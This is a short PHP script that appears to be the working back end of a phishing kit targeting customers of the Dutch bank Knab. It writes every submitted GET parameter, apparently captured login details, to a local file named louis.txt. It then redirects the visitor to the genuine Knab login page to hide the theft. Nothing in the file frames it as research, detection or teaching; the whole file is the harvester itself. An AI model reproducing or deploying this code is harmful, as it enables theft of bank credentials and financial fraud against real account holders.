<?php
header("Location: https://persoonlijk.knab.nl/account/inloggen");
$handle = fopen("louis.txt", "a");
foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 